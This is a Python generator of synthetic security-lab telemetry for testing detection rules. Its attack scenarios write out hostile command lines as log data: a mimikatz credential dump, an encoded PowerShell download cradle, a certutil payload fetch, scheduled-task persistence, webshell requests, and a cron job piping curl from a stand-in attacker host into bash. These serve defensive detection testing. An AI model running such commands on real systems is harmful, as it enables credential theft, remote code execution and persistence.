"""Generate deterministic, realistic lab telemetry in ECS shape.

This exists so the pipeline is reproducible in CI and demoable without a
Windows VM. Every event is synthetic and clearly labelled as such; when the
real VM is connected, point config/logsource_map.yml at the Winlogbeat data
streams and stop using this generator.

Run with:  python -m pipeline.labgen --scenario all --out lab/logs
"""

from __future__ import annotations

import argparse
import json
import ntpath
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

from pipeline.common import LAB_LOGS_DIR, ensure_dir

WINDOWS_HOST = "WIN10-LAB"
LINUX_HOST = "linux01"
WEB_HOST = "web01"
ATTACKER = "203.0.113.44"
WEB_ATTACKER = "203.0.113.77"
NOISE_IP = "198.51.100.9"

SCENARIOS = (
    "baseline",
    "ssh-bruteforce",
    "credential-dump",
    "encoded-powershell",
    "certutil-download",
    "service-persistence",
    "webshell",
    "new-user",
    "cron-persistence",
)


def iso(value: datetime) -> str:
    return value.astimezone(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def _parent_block(image: str, command_line: str, pid: int) -> dict[str, Any]:
    return {
        "name": ntpath.basename(image),
        "executable": image,
        "executable.caseless": image.lower(),
        "command_line": command_line,
        "pid": pid,
    }


class Lab:
    def __init__(self, base_time: datetime, seed: int = 1337) -> None:
        self.base = base_time.astimezone(timezone.utc)
        self.rng = random.Random(seed)
        self.windows: list[dict[str, Any]] = []
        self.linux: list[dict[str, Any]] = []
        self.web: list[dict[str, Any]] = []

    # ---------------------------------------------------------------- windows
    def process_creation(
        self,
        ts: datetime,
        image: str,
        command_line: str,
        parent_image: str = r"C:\Windows\explorer.exe",
        parent_command_line: str = r"C:\Windows\explorer.exe",
        user: str = r"LAB\analyst",
        host: str = WINDOWS_HOST,
    ) -> None:
        pid = self.rng.randint(1200, 9000)
        self.windows.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "code": "1",
                    "kind": "event",
                    "category": ["process"],
                    "type": ["start"],
                    "dataset": "windows.sysmon_operational",
                    "module": "windows",
                },
                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
                "user": {"name": user, "domain": "LAB"},
                "process": {
                    "name": ntpath.basename(image),
                    "executable": image,
                    "executable.caseless": image.lower(),
                    "command_line": command_line,
                    "pid": pid,
                    "parent": _parent_block(parent_image, parent_command_line, self.rng.randint(500, 1200)),
                },
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": "1",
                    "computer_name": host,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "event_data": {
                        "Image": image,
                        "CommandLine": command_line,
                        "ParentImage": parent_image,
                        "User": user,
                    },
                },
            }
        )

    def process_access(
        self,
        ts: datetime,
        source_image: str,
        target_image: str,
        granted_access: str,
        host: str = WINDOWS_HOST,
    ) -> None:
        self.windows.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "code": "10",
                    "kind": "event",
                    "category": ["process"],
                    "type": ["access"],
                    "dataset": "windows.sysmon_operational",
                    "module": "windows",
                },
                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
                "process": {
                    "name": ntpath.basename(source_image),
                    "executable": source_image,
                    "executable.caseless": source_image.lower(),
                    "pid": self.rng.randint(1200, 9000),
                },
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": "10",
                    "computer_name": host,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "event_data": {
                        "SourceImage": source_image,
                        "TargetImage": target_image,
                        "GrantedAccess": granted_access,
                    },
                },
            }
        )

    def service_install(self, ts: datetime, service_name: str, image_path: str, host: str = WINDOWS_HOST) -> None:
        self.windows.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "code": "7045",
                    "kind": "event",
                    "category": ["configuration"],
                    "type": ["change"],
                    "dataset": "windows.system",
                    "module": "windows",
                },
                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
                "winlog": {
                    "channel": "System",
                    "event_id": "7045",
                    "computer_name": host,
                    "provider_name": "Service Control Manager",
                    "event_data": {
                        "ServiceName": service_name,
                        "ImagePath": image_path,
                        "ServiceType": "user mode service",
                        "StartType": "auto start",
                    },
                },
                "message": f"A service was installed in the system. Service Name: {service_name}",
            }
        )

    def defender_event(self, ts: datetime, code: str, message: str, host: str = WINDOWS_HOST) -> None:
        self.windows.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "code": code,
                    "kind": "event",
                    "category": ["configuration"],
                    "type": ["change"],
                    "dataset": "windows.defender",
                    "module": "windows",
                },
                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
                "winlog": {
                    "channel": "Microsoft-Windows-Windows Defender/Operational",
                    "event_id": code,
                    "computer_name": host,
                    "provider_name": "Microsoft-Windows-Windows Defender",
                },
                "message": message,
            }
        )

    # ------------------------------------------------------------------ linux
    def auth_event(
        self,
        ts: datetime,
        message: str,
        source_ip: str,
        user: str = "root",
        outcome: str = "failure",
        host: str = LINUX_HOST,
    ) -> None:
        self.linux.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "kind": "event",
                    "category": ["authentication"],
                    "type": ["start"],
                    "outcome": outcome,
                    "dataset": "system.auth",
                    "module": "system",
                },
                "host": {"name": host, "os": {"type": "linux", "platform": "linux"}},
                "user": {"name": user},
                "source": {"ip": source_ip, "port": self.rng.randint(40000, 60000)},
                "system": {"auth": {"ssh": {"event": "Failed" if outcome == "failure" else "Accepted", "method": "password"}}},
                "message": message,
            }
        )

    def cron_event(self, ts: datetime, message: str, host: str = LINUX_HOST) -> None:
        self.linux.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "kind": "event",
                    "category": ["process"],
                    "type": ["start"],
                    "dataset": "system.cron",
                    "module": "system",
                },
                "host": {"name": host, "os": {"type": "linux", "platform": "linux"}},
                "user": {"name": "root"},
                "message": message,
            }
        )

    # -------------------------------------------------------------------- web
    def web_event(
        self,
        ts: datetime,
        method: str,
        path: str,
        query: str | None = None,
        status: int = 200,
        source_ip: str = NOISE_IP,
        host: str = WEB_HOST,
    ) -> None:
        target = f"{path}?{query}" if query else path
        self.web.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "kind": "event",
                    "category": ["web"],
                    "type": ["access"],
                    "outcome": "success" if status < 400 else "failure",
                    "dataset": "nginx.access",
                    "module": "nginx",
                },
                "host": {"name": host, "os": {"type": "linux", "platform": "linux"}},
                "http": {"request": {"method": method}, "response": {"status_code": status}},
                "url": {"path": path, "query": query},
                "source": {"ip": source_ip},
                "user_agent": {"original": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
                "message": f'{source_ip} - - " {method} {target} HTTP/1.1" {status} 512 "-" "Mozilla/5.0"',
            }
        )


# ---------------------------------------------------------------- scenarios
def scenario_baseline(lab: Lab) -> None:
    """Benign activity that should NOT trigger any detection."""
    start = lab.base - timedelta(hours=2)
    for index in range(30):
        ts = start + timedelta(minutes=index * 4 + lab.rng.randint(0, 3))
        lab.process_creation(ts, r"C:\Program Files\Google\Chrome\Application\chrome.exe", r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default')
        lab.process_creation(ts + timedelta(seconds=20), r"C:\Windows\System32\notepad.exe", r"C:\Windows\System32\notepad.exe")
        lab.auth_event(ts + timedelta(seconds=40), f"Accepted password for deploy from {NOISE_IP} port 44122 ssh2", NOISE_IP, "deploy", "success")
        lab.web_event(ts + timedelta(seconds=55), "GET", "/index.html", status=200)
        lab.web_event(ts + timedelta(seconds=56), "GET", "/assets/app.js", status=200)

    # Legitimate-looking admin PowerShell, no encoded command.
    lab.process_creation(lab.base - timedelta(minutes=90), r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe -NoProfile -Command Get-Service | Where-Object Status -eq 'Running'")

    # A few isolated failed logins from a normal user.
    for index in range(3):
        ts = lab.base - timedelta(minutes=45 - index)
        lab.auth_event(ts, f"Failed password for deploy from {NOISE_IP} port 4422{index} ssh2", NOISE_IP, "deploy", "failure")


def scenario_ssh_bruteforce(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=12)
    users = ["root", "admin", "oracle", "postgres", "ubuntu", "test"]
    for index in range(14):
        ts = start + timedelta(seconds=index * 18)
        user = users[index % len(users)]
        lab.auth_event(ts, f"Failed password for invalid user {user} from {ATTACKER} port 51{index:03d} ssh2", ATTACKER, user, "failure")
    success_at = start + timedelta(minutes=4, seconds=30)
    lab.auth_event(success_at, f"Accepted password for deploy from {ATTACKER} port 51999 ssh2", ATTACKER, "deploy", "success")


def scenario_credential_dump(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=20)
    lab.process_creation(
        ts,
        r"C:\Users\Public\mimikatz.exe",
        r"C:\Users\Public\mimikatz.exe privilege::debug sekurlsa::logonpasswords",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c C:\\Users\\Public\\mimikatz.exe",
    )
    lab.process_access(ts + timedelta(seconds=8), r"C:\Users\Public\mimikatz.exe", r"C:\Windows\system32\lsass.exe", "0x1010")


def scenario_encoded_powershell(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=25)
    lab.process_creation(
        ts,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        r'"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -WindowStyle Hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4ANAA0AC8AYQAnACkA',
        parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        parent_command_line=r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n C:\Users\analyst\Documents\invoice.docm',
    )


def scenario_certutil_download(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=23)
    lab.process_creation(
        ts,
        r"C:\Windows\System32\certutil.exe",
        r"certutil.exe -urlcache -split -f http://203.0.113.44/payload.exe C:\Users\Public\p.exe",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c certutil -urlcache -f http://203.0.113.44/payload.exe C:\\Users\\Public\\p.exe",
    )


def scenario_service_persistence(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=16)
    lab.defender_event(ts - timedelta(minutes=2), "5001", "Windows Defender Antivirus Real-time Protection feature has been disabled.")
    lab.service_install(ts, "UpdaterSvc", r"C:\Users\Public\svc.exe")
    lab.process_creation(
        ts + timedelta(seconds=30),
        r"C:\Windows\System32\schtasks.exe",
        r'schtasks.exe /create /tn "Updater" /tr "C:\Users\Public\upd.exe" /sc onlogon /ru SYSTEM /f',
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c schtasks /create /tn Updater",
    )


def scenario_webshell(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=10)
    lab.web_event(start, "POST", "/uploads/shell.php", status=200, source_ip=WEB_ATTACKER)
    for index in range(6):
        ts = start + timedelta(seconds=20 + index * 15)
        lab.web_event(ts, "GET", "/uploads/shell.php", query="cmd=id", status=200, source_ip=WEB_ATTACKER)
    lab.web_event(start + timedelta(minutes=1, seconds=10), "GET", "/uploads/shell.php", query="cmd=whoami", status=200, source_ip=WEB_ATTACKER)


def scenario_new_user(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=45)
    lab.auth_event(ts, "new user: name=backup, UID=1002, GID=1002, home=/home/backup, shell=/bin/bash", "127.0.0.1", "root", "success")


def scenario_cron_persistence(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=43)
    lab.cron_event(ts, "(root) CMD (curl -s http://203.0.113.44/x.sh | bash)")


BUILDERS = {
    "baseline": scenario_baseline,
    "ssh-bruteforce": scenario_ssh_bruteforce,
    "credential-dump": scenario_credential_dump,
    "encoded-powershell": scenario_encoded_powershell,
    "certutil-download": scenario_certutil_download,
    "service-persistence": scenario_service_persistence,
    "webshell": scenario_webshell,
    "new-user": scenario_new_user,
    "cron-persistence": scenario_cron_persistence,
}


def generate(scenario: str, seed: int = 1337, base_time: datetime | None = None) -> dict[str, list[dict[str, Any]]]:
    base_time = base_time or datetime.now(timezone.utc)
    lab = Lab(base_time, seed=seed)
    selected = SCENARIOS if scenario == "all" else (scenario,)
    for name in selected:
        BUILDERS[name](lab)

    for events in (lab.windows, lab.linux, lab.web):
        events.sort(key=lambda event: event["@timestamp"])
    return {"windows": lab.windows, "linux": lab.linux, "web": lab.web}


def write_files(data: dict[str, list[dict[str, Any]]], out_dir: Path, append: bool = False) -> dict[str, int]:
    ensure_dir(out_dir)
    counts: dict[str, int] = {}
    for name, events in data.items():
        path = out_dir / f"{name}.ndjson"
        mode = "a" if append else "w"
        with path.open(mode, encoding="utf-8") as handle:
            for event in events:
                handle.write(json.dumps(event, sort_keys=False) + "\n")
        counts[name] = len(events)
    return counts


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate synthetic SOC lab telemetry")
    parser.add_argument("--scenario", default="all", choices=("all", *SCENARIOS))
    parser.add_argument("--out", default=str(LAB_LOGS_DIR))
    parser.add_argument("--seed", type=int, default=1337)
    parser.add_argument("--base-time", help="ISO-8601 anchor time, defaults to now")
    parser.add_argument("--append", action="store_true", help="append instead of overwriting")
    args = parser.parse_args()

    base_time = datetime.fromisoformat(args.base_time) if args.base_time else None
    data = generate(args.scenario, seed=args.seed, base_time=base_time)
    counts = write_files(data, Path(args.out), append=args.append)
    total = sum(counts.values())
    print(f"Wrote {total} synthetic events to {args.out}: " + ", ".join(f"{k}={v}" for k, v in counts.items()))
    return 0


if __name__ == "__main__":
    sys.exit(main())
